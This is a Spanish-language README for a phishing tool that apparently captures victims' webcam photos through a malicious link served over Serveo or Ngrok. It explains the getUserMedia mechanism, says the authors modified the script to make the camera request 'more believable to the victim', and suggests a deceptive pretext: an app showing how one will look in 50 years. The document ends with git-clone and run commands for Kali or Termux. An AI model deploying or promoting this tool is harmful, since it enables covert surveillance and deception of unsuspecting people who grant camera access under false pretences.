# MOD v1.0
Tome fotos de la cámara web simplemente enviando un enlace malicioso

![cheese](https://i.ibb.co/X2QK7zQ/21.gif)

#¿Cómo funciona?
<p>La herramienta genera una página HTTPS maliciosa utilizando los métodos Serveo o Ngrok Port Forwarding, y un código javascript para cam las solicitudes utilizando MediaDevices.getUserMedia. </p>

</p>HICIMOS UNA MODIFICACION EN EL SCRIPT Y EN LOS ARCHIVOS PARA QUE SEA UN POCO MAS CREIBLE A LA VICTIMA SOBRE EL ACCESO A LA CAMARA</p>

![cheese](https://i.ibb.co/X2QK7zQ/21.gif)

<p>El método MediaDevices.getUserMedia () solicita al usuario permiso para usar una entrada de medios que produce un MediaStream con pistas que contienen los tipos de medios solicitados. Esa transmisión puede incluir, por ejemplo, una pista de video (producida por una fuente de video virtual o de hardware, como una cámara, un dispositivo de grabación de video, un servicio para compartir pantalla, etc.), una pista de audio (de manera similar, producida por un dispositivo físico o fuente de audio virtual como un micrófono, convertidor A / D o similar) y posiblemente otros tipos de pistas. </p>

[Ver más sobre MediaDEvices.getUserMedia() here](https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia)
<p> Para convencer al objetivo de que otorgue permisos para acceder a la cámara, la página utiliza un código javascript y una modificacion de los parametros de la camara, puede decirle a las victimas que se trata de una aplicacion que muestra como seras dentro de 50 años.</p>

## Installing (Kali Linux/Termux):

```
https://github.com/HORUS-HACK/mod-video.git
cd mod-video
bash horus.sh
```


